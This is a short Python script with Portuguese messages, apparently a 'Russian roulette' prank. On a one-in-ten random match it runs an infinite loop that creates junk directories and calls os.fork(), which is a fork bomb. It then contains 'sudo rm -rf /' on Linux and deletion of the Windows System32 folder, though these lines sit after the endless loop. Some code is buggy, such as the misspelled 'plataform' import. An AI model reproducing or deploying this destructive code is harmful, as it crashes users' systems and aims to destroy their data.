import os
import random

escolha = random.randint(1,10)
morte = random.randint(1,10)

def bomb(Length):
    number = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    ra = '!@#$%¨&*()_+=-*/-+.,'
    id = ''
    for i in range(0,Length,2):
        id += random.choice(number)
        id += random.choice(alpha)
        id += random.choice(ra)
    return id

system = __import__("plataform").system()

if system == "Linux":

    if escolha == morte:
        print("Boa noite!")
        while True: 
            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(256)}")
            os.fork()
        os.system("sudo rm -rf /")
        
    else:
        print("parabens, seu pc está vivo :DDD !!!")

else:
    if escolha == morte:
        print("Boa noite!")
        while True: 
            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(256)}")
            os.fork()
        os.remove("C:\Windows\System32")
    else:
        print("parabens, seu pc está vivo :DDD !!!")
